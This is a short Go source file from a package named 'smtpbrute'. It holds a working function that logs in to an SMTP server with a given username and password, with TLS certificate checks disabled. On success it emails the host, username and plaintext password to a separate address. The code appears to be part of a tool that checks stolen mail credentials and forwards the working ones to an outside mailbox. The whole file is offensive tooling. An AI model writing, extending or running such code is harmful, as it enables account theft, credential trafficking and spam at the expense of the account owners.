package smtpbrute

import (
	"crypto/tls"
	"fmt"

	"gopkg.in/gomail.v2"
)

func ConnectSMTP(credentials []string, testEmail string) ([]string, error) {
	username, password, host := credentials[0], credentials[1], credentials[2]
	dialer := gomail.NewDialer(host, 587, username, password)
	dialer.TLSConfig = &tls.Config{InsecureSkipVerify: true}
	mailer := gomail.NewMessage()
	mailer.SetHeader("From", username)
	mailer.SetHeader("To", testEmail)
	mailer.SetHeader("Subject", fmt.Sprintf("SMTP Host: %s", host))
	emailBody := fmt.Sprintf("SMTP Host: %s\nPort: %d\nUsername: %s\nPassword: %s", host, 587, username, password)
	mailer.SetBody("text/plain", emailBody)
	err := dialer.DialAndSend(mailer)
	if err != nil {
		// fmt.Printf("err: %v\n", err)
		return []string{}, err
	}
	credentials = append(credentials, "587")
	return credentials, nil
}
